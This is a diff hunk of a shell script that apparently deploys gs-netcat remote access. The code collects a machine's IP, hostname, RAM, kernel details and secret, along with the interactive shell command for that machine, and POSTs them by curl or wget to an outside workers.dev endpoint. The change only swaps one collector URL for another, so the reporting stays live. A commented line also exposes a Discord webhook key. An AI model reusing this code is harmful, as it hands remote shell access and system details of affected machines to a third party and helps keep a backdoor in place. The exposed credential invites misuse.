@@ -107,8 +107,8 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 	ram=$(free -m | awk '/^Mem:/{printf("%.1fGb\n",$2/1000)}')
 	ip=$(hostname -I | awk '{print $1}')
 	data='{"ip":"${ip}", "ram": "${ram}", "hostname": "$(hostname)", "system": "$(uname -rom)", "uuid": "${GS_SECRET}" ,"access": "gs-netcat -i -s ${GS_SECRET}"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://kvdb.addea.workers.dev/add")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://kvdb.addea.workers.dev/add")
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://kvdb-gsocks.devq.workers.dev/add")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://kvdb-gsocks.devq.workers.dev/add")
 }
 ### discord webhook
 # GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
